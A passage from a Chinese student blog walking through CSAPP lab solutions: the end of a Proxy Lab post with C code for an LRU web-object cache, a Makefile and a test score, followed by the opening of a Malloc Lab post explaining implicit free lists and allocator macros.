= Malloc(n * <span class="keyword">sizeof</span>(cache_line));</span><br><span class="line">    cache-&gt;n = n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;	<span class="comment">// 设置有效位和时间戳</span></span><br><span class="line">    	cache-&gt;buf[i].vaild = <span class="number">0</span>;</span><br><span class="line">    	cache-&gt;buf[i].timestamp = <span class="number">0</span>;</span><br><span class="line">        Sem_init(&amp;cache-&gt;buf[i].mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cache-&gt;readers = <span class="number">0</span>;				<span class="comment">// 一开始没有读者</span></span><br><span class="line">    Sem_init(&amp;cache-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>);	<span class="comment">// 初始化互斥锁</span></span><br><span class="line">    Sem_init(&amp;cache-&gt;w, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_write</span><span class="params">(cache *cache, <span class="type">char</span> *uri, <span class="type">char</span> *response)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;cache-&gt;w);	<span class="comment">// 上锁</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> index = cache_insert_index(cache);	<span class="comment">// 找到缓存中合适的位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(cache-&gt;buf[index].response, response);	<span class="comment">// 存入缓存</span></span><br><span class="line">    <span class="built_in">strcpy</span>(cache-&gt;buf[index].uri, uri);</span><br><span class="line">    cache-&gt;buf[index].vaild = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;n; ++i) &#123;	<span class="comment">// 更新时间戳</span></span><br><span class="line">    	<span class="keyword">if</span> (cache-&gt;buf[i].vaild) &#123;</span><br><span class="line">    	    cache-&gt;buf[i].timestamp++;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cache-&gt;buf[index].timestamp = <span class="number">0</span>;	</span><br><span class="line">    </span><br><span class="line">    V(&amp;cache-&gt;w);	<span class="comment">// 解锁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_insert_index</span><span class="params">(cache *cache)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;n; ++i) &#123; <span class="comment">// 是否有未使用的缓存</span></span><br><span class="line">    	<span class="keyword">if</span> (!cache-&gt;buf[i].vaild) </span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cache_LRU(cache);	<span class="comment">// 缓存满了，LRU 驱逐</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_LRU</span><span class="params">(cache *cache)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxtimestamp = cache-&gt;buf[<span class="number">0</span>].timestamp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; cache-&gt;n; ++i) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (cache-&gt;buf[i].timestamp &gt; maxtimestamp) &#123;</span><br><span class="line">    	    index = i;</span><br><span class="line">    	    maxtimestamp = cache-&gt;buf[i].timestamp;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_read</span><span class="params">(cache *cache, <span class="type">int</span> fd, <span class="type">char</span> *uri)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;cache-&gt;mutex);</span><br><span class="line">    cache-&gt;readers++;</span><br><span class="line">    <span class="keyword">if</span> (cache-&gt;readers == <span class="number">1</span>)	<span class="comment">// 是否是第一个读者</span></span><br><span class="line">    	P(&amp;cache-&gt;w);</span><br><span class="line">    V(&amp;cache-&gt;mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> index, flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((index = cache_search_index(cache, uri)) != <span class="number">-1</span>) &#123;	<span class="comment">// 如果缓存命中</span></span><br><span class="line">    	Rio_writen(fd, cache-&gt;buf[index].response, <span class="built_in">strlen</span>(cache-&gt;buf[index].response));</span><br><span class="line">    	</span><br><span class="line">        P(&amp;cache-&gt;buf[index].mutex);	</span><br><span class="line">    	cache-&gt;buf[index].timestamp = <span class="number">0</span>;	<span class="comment">// 更新时间戳</span></span><br><span class="line">        V(&amp;cache-&gt;buf[index].mutex);</span><br><span class="line">    	</span><br><span class="line">    	flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    P(&amp;cache-&gt;mutex);</span><br><span class="line">    cache-&gt;readers--;</span><br><span class="line">    <span class="keyword">if</span> (cache-&gt;readers == <span class="number">0</span>) <span class="comment">// 是否是最后一个读者</span></span><br><span class="line">    	V(&amp;cache-&gt;w);</span><br><span class="line">    V(&amp;cache-&gt;mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_search_index</span><span class="params">(cache *cache, <span class="type">char</span> *uri)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;n; ++i) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (cache-&gt;buf[i].vaild &amp;&amp; !<span class="built_in">strcmp</span>(cache-&gt;buf[i].uri, uri)) &#123;	<span class="comment">// 缓存行有效且 uri 相同</span></span><br><span class="line">    	    <span class="keyword">return</span> i;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>cache.h</strong> 代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __CACHE_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __CACHE_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> response[MAX_OBJECT_SIZE];	<span class="comment">// 缓冲区</span></span><br><span class="line">    <span class="type">char</span> uri[MAXLINE];				<span class="comment">// 缓存的 Web 对象对应的 HTTP 请求中的 uri</span></span><br><span class="line">    <span class="type">int</span> vaild;						<span class="comment">// 有效位</span></span><br><span class="line">    <span class="type">int</span> timestamp;					<span class="comment">// 时间戳</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;					<span class="comment">// 互斥锁</span></span><br><span class="line">&#125; cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    cache_line *buf;</span><br><span class="line">    <span class="type">int</span> n;			<span class="comment">// 最大容量</span></span><br><span class="line">    <span class="type">int</span> readers;	<span class="comment">// 正在访问缓冲区的读者数</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;	<span class="comment">// 互斥锁，互斥访问 readers</span></span><br><span class="line">    <span class="type">sem_t</span> w;		<span class="comment">// 互斥锁，互斥访问缓冲区</span></span><br><span class="line">&#125; cache;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_init</span><span class="params">(cache *cache, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cache_write</span><span class="params">(cache *cache, <span class="type">char</span> *uri, <span class="type">char</span> *response)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_search_index</span><span class="params">(cache *cache, <span class="type">char</span> *uri)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_insert_index</span><span class="params">(cache *cache)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_LRU</span><span class="params">(cache *cache)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cache_read</span><span class="params">(cache *cache, <span class="type">int</span> fd, <span class="type">char</span> *uri)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>sbuf.c、sbuf.h 和之前一样</p>
</blockquote>
<h2 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>因为新增了 cache.c，所以我们也需要修改 Makefile 文件，修改内容如下</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile for Proxy Lab </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You may modify this file any way you like (except for the handin</span></span><br><span class="line"><span class="comment"># rule). You instructor will type &quot;make&quot; on your specific Makefile to</span></span><br><span class="line"><span class="comment"># build your proxy from sources.</span></span><br><span class="line"></span><br><span class="line">CC = gcc</span><br><span class="line">CFLAGS = -g -Wall</span><br><span class="line">LDFLAGS = -lpthread</span><br><span class="line"></span><br><span class="line"><span class="section">all: proxy</span></span><br><span class="line"></span><br><span class="line"><span class="section">csapp.o: csapp.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c csapp.c</span><br><span class="line"></span><br><span class="line"><span class="section">sbuf.o: sbuf.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c sbuf.c</span><br><span class="line">	</span><br><span class="line"><span class="section">cache.o: cache.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c cache.c</span><br><span class="line"></span><br><span class="line"><span class="section">proxy.o: proxy.c csapp.h</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c proxy.c</span><br><span class="line"></span><br><span class="line"><span class="section">proxy:proxy.o csapp.o sbuf.o cache.o</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> proxy.o  csapp.o sbuf.o cache.o -o proxy <span class="variable">$(LDFLAGS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creates a tarball in ../proxylab-handin.tar that you can then</span></span><br><span class="line"><span class="comment"># hand in. DO NOT MODIFY THIS!</span></span><br><span class="line"><span class="section">handin:</span></span><br><span class="line">	(make clean; cd ..; tar cvf <span class="variable">$(USER)</span>-proxylab-handin.tar proxylab-handout --exclude tiny --exclude nop-server.py --exclude proxy --exclude driver.sh --exclude port-for-user.pl --exclude free-port.sh --exclude <span class="string">&quot;.*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *~ *.o proxy core *.tar *.zip *.gzip *.bzip *.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Test-3"><a href="#Test-3" class="headerlink" title="Test"></a>Test</h1><ul>
<li><strong>make &amp; .&#x2F;driver.sh</strong>，整体的测试结果如下</li>
</ul>
<img src="/2024/04/15/CSAPP-Lab8/image-20240419095037010.png" class="" title="image-20240419095037010">

<ul>
<li>满分 70 分拿下！！！</li>
</ul>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/497982541">CSAPP | Lab9-Proxy Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8c4bfc9e3d3b">CSAPP之详解ProxyLab - 简书 (jianshu.com)</a>	</p>
<p>[CSAPP的Lab学习——ProxyLab-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43264167/article/details/133042198?ops_request_misc=%7B%22request_id%22:%22171345187416800178589876%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171345187416800178589876&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-133042198-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=proxy">https://blog.csdn.net/qq_43264167/article/details/133042198?ops_request_misc={&quot;request_id&quot;%3A&quot;171345187416800178589876&quot;%2C&quot;scm&quot;%3A&quot;20140713.130102334..&quot;}&amp;request_id=171345187416800178589876&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-133042198-null-null.142^v100^pc_search_result_base4&amp;utm_term=proxy</a> lab&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/680187157">更适合北大宝宝体质的 Proxy Lab 踩坑记 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/651472278">CSAPP LAB 8 ProxyLab - 知乎 (zhihu.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/04/07/CSAPP-Lab7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/07/CSAPP-Lab7/" class="post-title-link" itemprop="url">CSAPP MallocLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-07 07:49:39" itemprop="dateCreated datePublished" datetime="2024-04-07T07:49:39+08:00">2024-04-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-04-09 19:31:11" itemprop="dateModified" datetime="2024-04-09T19:31:11+08:00">2024-04-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>实验讲义：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">malloclab.dvi (cmu.edu)</a></p>
</li>
<li><p>在本实验中，我们将为 C 程序编写一个动态存储分配器，即自己的 malloc、free 和 realloc 例程版本</p>
</li>
<li><p>我们在 <strong>mm.c</strong> 中实现这些函数，它们具有如下形式</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>mm.c 文件中已经实现了最简单但功能仍然正确的 malloc 包，以此为起点，修改这些函数</p>
</blockquote>
<ul>
<li><strong>memlib.c</strong> 软件包模拟动态内存分配器的内存系统，我们可以在 mm.c 中调用 memlib.c 中的以下函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *mem <span class="title function_">sbrk</span><span class="params">(<span class="type">int</span> incr)</span>;	<span class="comment">// 语义与 Unix sbrk 函数相同，只是 mem sbrk 只接受正非零整数参数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mem heap <span class="title function_">lo</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">// 返回指向堆中第一个字节的泛型指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mem heap <span class="title function_">hi</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">// 返回指向堆中最后一个字节的泛型指针</span></span><br><span class="line"></span><br><span class="line">size t mem <span class="title function_">heapsize</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">// 返回堆的当前大小（以字节为单位）</span></span><br><span class="line"></span><br><span class="line">size t mem <span class="title function_">pagesize</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">// 返回系统的页面大小（以字节为单位）（Linux 系统上为 4K (即 4000 byte)）</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>驱动程序 <strong>mdriver.c</strong> 用来测试 mm.c 包的正确性、空间利用率和吞吐量</p>
</li>
<li><p>由于官网的实验材料中缺少测试用例，我们可以在以下链接下载它</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/kcxain/CSAPP-Lab">kcxain&#x2F;CSAPP-Lab: My solutions to the labs of CSAPP &amp; CMU 15-213 (github.com)</a></p>
<blockquote>
<p>在 initial_labs&#x2F;08_Malloc Lab&#x2F;traces 中</p>
</blockquote>
</li>
</ul>
</li>
<li><p>通过 <strong>.&#x2F;mdriver -t .&#x2F;traces -V</strong> 进行测试</p>
</li>
<li><p>讲义中的一些要求</p>
<ul>
<li><p>不应更改 mm.c 中的任何接口</p>
</li>
<li><p>不应调用任何与内存管理相关的库调用或系统调用</p>
<blockquote>
<p>不包括在代码中使用 malloc、calloc、free、realloc、sbrk、brk 或这些调用的任何变体</p>
</blockquote>
</li>
<li><p>不允许在 mm.c 程序中定义任何全局或静态复合数据结构，例如数组、结构、树或列表</p>
<blockquote>
<p>但是，你可以在 mm.c 中声明全局标量变量，例如整数、浮点数和指针</p>
</blockquote>
</li>
<li><p>为了与 libc malloc 包保持一致，该包返回在 8 字节边界上对齐的块，分配器必须始终返回与 8 字节边界对齐的指针</p>
</li>
</ul>
</li>
<li><p>在开始之前，我们要了解实现一个实际的分配器需要考虑的几个问题</p>
<ul>
<li>空闲块组织：如何记录空闲块</li>
<li>放置：如何先择一个合适的空闲块来放置一个新分配的块</li>
<li>分割：在将一个新分配的空闲块放置到某个空闲块后，如何处理这个空闲块中的剩余部分</li>
<li>合并：如何处理一个刚刚被释放的块</li>
</ul>
</li>
</ul>
<h1 id="implicit-free-list"><a href="#implicit-free-list" class="headerlink" title="implicit free list"></a>implicit free list</h1><ul>
<li>我们的第一种实现是 CSAPP 书籍中重点讨论的一种称为 <strong>隐式空闲链表</strong> 的空闲块组织，具体形式如下</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240407204907935.png" class="" title="image-20240407204907935">

<ul>
<li><p>堆中的第一个字是一个对齐的、不使用的 <strong>填充字</strong>；填充字后边是一个特殊的 <strong>序言快</strong>，只有一个头部和一个脚部组成；序言块后边是一些 <strong>普通块</strong>；堆总是以一个特殊的 <strong>结尾块</strong> 来结束</p>
<blockquote>
<p>结尾块总是被标示为大小为 0 的已分配块，这是为了方便合并时的判断，否则在合并时总是需要关注是否到了边界</p>
</blockquote>
</li>
<li><p>堆中的块，它包含一个头部和一个脚部以及有效载荷；头部 4 字节大小（32 位），低 3 位表示当前块是否空闲，高 29 位表示这个块的大小；脚部是头部的一个副本。具体形式如下</p>
<blockquote>
<p>脚部实际仅存在于空闲块，已分配块中不需要脚部；而有效载荷仅存在于已分配的块</p>
</blockquote>
</li>
</ul>
<img src="/2024/04/07/CSAPP-Lab7/image-20240407134432414.png" class="" title="image-20240407134432414">

<ul>
<li><p>为什么要有一个额外的脚部呢？答曰：这为了方便合并</p>
<ul>
<li>如果仅有头部的话，隐式空闲链表就像一个单链表，仅可以通过一个块中头部的 size（块大小） 来移动到下一个块</li>
<li>然而在合并时，当前空闲块不仅可以和下一个块合并（如果空闲的话），也可以和上一个块合并，而对于仅有一个头部的块格式来说，合并上一个空闲块就需要遍历隐式空闲链表来得到上一个块的起始位置，很麻烦！</li>
<li>而当我们有了脚部后，依照头部和脚部的固定大小，我们可以很容易的从当前块的起始位置得到上一个脚部，从而知道上一个块的大小，这样就可以很容易的从当前块移动到上一个块，方便了合并上一个空闲块！</li>
</ul>
</li>
<li><p>在空闲链表中操作头部和脚部都是很麻烦的，涉及大量的强制类型转换和指针运算，很容易出错，因此我们定义一组宏来帮助访问空闲链表是很有帮助的！具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4				<span class="comment">// 单字，头部/脚部大小（4 字节）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8				<span class="comment">// 双字（8 字节）	</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12)	<span class="comment">// 空闲块的默认大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))	<span class="comment">// 打包头部/脚部中 size（大小）和 alloc（有效位）到一个字中</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p 指针是一个 void* 指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned int *)(p))					<span class="comment">// 读 p 指针指向的值</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) ((*(unsigned int *)(p)) = (val))	<span class="comment">// 将 val 写入 p 指针所指向的位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)	<span class="comment">// 读取头部/脚部中 size，即读取一个块的大小（p 指向一个块的头部/脚部）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)	<span class="comment">// 读取头部/脚部中 alloc，即读取一个块的有效位（001 表示有效，000 表示无效）</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bp 指向这个块载荷部分的起始位置</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)							<span class="comment">// 得到 bp 这个块的头部指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)	<span class="comment">// 得到 bp 这个块的脚部指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))	<span class="comment">//得到下一个块载荷位置的指针</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))	<span class="comment">// 得到上一个块的载荷位置的指针</span></span></span><br></pre></td></tr></table></figure>

<h2 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h2><ul>
<li><p>heap_listp 是一个私有（static）全局变量，它始终指向序言块</p>
</li>
<li><p>初始化堆，首先得到 4 个字大小的内存空间，接着依次初始化填充字、序言块和结尾块。最后再创建初始的空闲块（普通块）</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)	<span class="comment">// 得到 4 个字大小的内存空间 </span></span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;	</span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);								<span class="comment">// 初始化填充字</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));	<span class="comment">// 初始化序言块的第一个部分</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));	<span class="comment">// 初始化序言块的第二个部分</span></span><br><span class="line">    PUT(heap_listp + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));		<span class="comment">// 初始化结尾块</span></span><br><span class="line">    heap_listp += (<span class="number">2</span> * WSIZE);						<span class="comment">// 令 heap_listp 指向序言块</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>)		<span class="comment">// 创建初始的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h2><ul>
<li><p>扩展堆指定字节。因为我们要保证对齐，但我们并不知道传入的 words 是奇数还是偶数，因此我们在传入参数时 &#x2F; WSIZE（4），在 extend_size 中具体判断否是偶数，奇数的话就 + 1 变成偶数，最后 * WSIZE 恢复大小，保证了 words 此时必定是偶数</p>
</li>
<li><p>初始化刚刚分配的空闲块的头部和脚部时有一个细节</p>
<ul>
<li>bp 初始时指向的是刚刚分配块的起始位置，也就是这个块头部的起始位置，第一个 PUT 操作会把原来堆中的结尾块当作新空闲块的头部来初始化</li>
<li>第二个 PUT 操作初始化分配块的倒数第二个字为脚部</li>
<li>第三个 PUT 操作则把分配块的最后一个字初始化为了堆的新的结尾块</li>
</ul>
</li>
<li><p>最后我们调用 coalesce 来合并相邻的空闲块。因为在创建这个空闲块之前，这个堆很有可能也是以一个空闲块结尾的</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
